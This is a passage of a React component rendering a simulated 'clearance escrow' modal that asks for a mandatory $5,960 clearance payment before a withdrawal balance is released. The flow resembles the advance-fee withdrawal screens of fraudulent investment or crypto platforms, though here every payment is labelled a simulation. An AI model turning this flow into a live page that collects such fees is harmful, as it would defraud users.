                            ? 'bg-cyan-950/50 border-cyan-500/50 text-cyan-200 ring-1 ring-cyan-500/30 font-semibold'
                            : 'bg-[#0a0f1d] border-[#182338] text-gray-500'
                        }`}
                      >
                        {isDone ? '✓ ' : ''}
                        {item.label}
                      </div>
                    );
                  })}
                </div>
              </div>
            )}

            {/* Simulation Confirmation Outcome */}
            {simulationStatus === 'confirmed' ? (
              <div className="bg-emerald-950/40 border border-emerald-500/40 rounded-xl p-4.5 space-y-3.5 animate-in fade-in duration-200">
                <div className="flex items-center justify-between">
                  <div className="flex items-center gap-2.5 text-emerald-400 font-bold text-sm">
                    <CheckCircle2 className="w-5 h-5 shrink-0" />
                    <span>Clearance Escrow Verified (Simulation Successful)</span>
                  </div>
                  <span className="text-[10px] font-mono bg-emerald-900/40 text-emerald-300 border border-emerald-700/40 px-2 py-0.5 rounded-full font-semibold">
                    100% Cleared
                  </span>
                </div>

                {/* Completed 100% Progress Bar */}
                <div className="w-full bg-[#04070d] h-2.5 rounded-full overflow-hidden p-0.5 border border-emerald-500/30">
                  <div className="h-full rounded-full bg-gradient-to-r from-emerald-500 to-teal-400 w-full" />
                </div>

                <p className="text-xs text-gray-300 leading-relaxed">
                  The mandatory $5,960.00 clearance payment has been simulated and verified. Full disbursement release of ${MAX_AVAILABLE_BALANCE.toLocaleString('en-US', { minimumFractionDigits: 2 })} has been authorized on the node ledger.
                </p>

                <div className="bg-[#060a10] border border-emerald-500/30 rounded-lg p-2.5 text-[11px] font-mono text-emerald-300 break-all">
                  <span className="text-gray-500 block text-[10px]">Mock Settlement Hash:</span>
                  {confirmedTxId}
                </div>

                {/* Re-trigger Simulation and Navigation Buttons */}
                <div className="flex flex-col sm:flex-row gap-2 pt-1">
                  <button
                    type="button"
                    onClick={handleSimulateClearance}
                    className="flex-1 py-2.5 bg-gradient-to-r from-cyan-500 to-emerald-500 hover:from-cyan-400 hover:to-emerald-400 text-black font-extrabold text-xs rounded-lg transition-all shadow-md shadow-cyan-500/20 flex items-center justify-center gap-1.5 cursor-pointer"
                    title="Re-run simulation (resets countdown timer)"
                  >
                    <RotateCcw className="w-3.5 h-3.5" />
                    <span>Re-trigger Payment Simulation</span>
                  </button>
                  <button
                    type="button"
                    onClick={() => {
                      handleCloseModal();
                      onNavigateDashboard();
                    }}
                    className="py-2.5 px-4 bg-[#141824] hover:bg-[#1c2233] text-gray-200 text-xs font-semibold rounded-lg border border-[#222d42] transition-colors cursor-pointer"
                  >
                    View in Dashboard
                  </button>
                  <button
                    type="button"
                    onClick={handleCloseModal}
                    className="py-2.5 px-3 bg-[#10141f] hover:bg-[#181d2c] text-gray-400 hover:text-white text-xs font-semibold rounded-lg border border-[#1b253b] transition-colors cursor-pointer"
                  >
                    Done
                  </button>
                </div>
              </div>
            ) : simulationStatus === 'idle' ? (
              /* Interactive Payment Simulation Confirmation Button */
              <div className="space-y-2.5">
                <button
                  type="button"
                  onClick={handleSimulateClearance}
                  disabled={isSimulatingPayment}
                  className="w-full py-3.5 px-5 bg-gradient-to-r from-emerald-500 to-teal-500 hover:from-emerald-400 hover:to-teal-400 disabled:opacity-50 text-black font-extrabold text-sm rounded-xl transition-all shadow-lg shadow-emerald-500/20 flex items-center justify-center gap-2 cursor-pointer"
                >
                  <Zap className="w-4 h-4" />
                  <span>Confirm Clearance Payment (Simulation)</span>
                </button>

                <button
                  type="button"
                  onClick={handleCloseModal}
                  className="w-full py-2.5 text-xs text-gray-400 hover:text-gray-200 transition-colors cursor-pointer text-center"
                >
                  Cancel / Return to Withdrawal Form
                </button>
              </div>
            ) : null}
            </div>
          </div>
        </div>
      )}
    </div>
  );
};
